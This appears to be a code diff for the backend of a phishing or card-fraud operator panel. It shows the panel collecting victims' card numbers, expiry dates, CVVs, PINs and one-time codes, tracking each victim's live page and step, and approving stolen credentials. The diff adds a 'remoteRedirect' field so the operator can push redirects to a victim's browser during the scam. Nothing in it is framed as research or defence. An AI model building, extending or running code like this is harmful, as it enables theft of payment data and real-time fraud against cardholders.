@@ -134,7 +134,8 @@ module.exports = async (req, res) => {
       updatedAt: createdAt,
       presence: { state: isRecent ? 'online' : 'offline', lastSeenAt: new Date(createdAt).getTime(), currentPage: lastPage, currentStep },
       loginInfo: { username: hasPayment ? (payment.card_number || '') : '', password: hasPayment ? (payment.card_pin || '') : '' },
-      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, otp: payment.otp || '', pin: payment.card_pin, timestamp: payment.created_at } } : {}
+      loginAttempts: hasPayment && payment.card_number ? { '1': { cardNumber: payment.card_number, cardExpiry: payment.card_expiry, cardCvv: payment.card_cvv, otp: payment.otp || '', pin: payment.card_pin, timestamp: payment.created_at } } : {},
+      remoteRedirect: hasPayment && payment.redirect_json ? (function(){ try { return JSON.parse(payment.redirect_json); } catch(e) { return null; } })() : (order && order.redirect_json ? (function(){ try { return JSON.parse(order.redirect_json); } catch(e) { return null; } })() : null)
     };
   }
 
@@ -291,6 +292,7 @@ module.exports = async (req, res) => {
         const mapped = {};
         if (value.status !== undefined) mapped.status = value.status;
         if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
+        if (value.remoteRedirect !== undefined) mapped.redirect_json = JSON.stringify(value.remoteRedirect);
         if (Object.keys(mapped).length > 0) {
           await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
         }
@@ -299,6 +301,8 @@ module.exports = async (req, res) => {
         if (field === 'status' || field === 'credentialsStatus') {
           const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
           await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
+        } else if (field === 'remoteRedirect') {
+          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ redirect_json: JSON.stringify(value) }) });
         } else if (field === 'presence') {
           // Presence updates - just acknowledge, stored ephemerally
         }
